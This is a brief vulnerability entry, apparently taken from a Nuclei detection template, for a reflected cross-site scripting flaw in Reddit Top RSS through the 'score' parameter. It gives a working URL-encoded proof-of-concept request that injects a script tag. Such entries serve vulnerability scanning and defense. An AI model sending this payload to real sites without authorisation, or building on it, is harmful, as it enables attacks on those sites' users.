# Vulnerability: Reddit Top RSS - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`reddittop-rss-xss.yaml`)

## Description
Reddit Top RSS contains a cross-site scripting vulnerability via the /?subreddit=news&score= parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

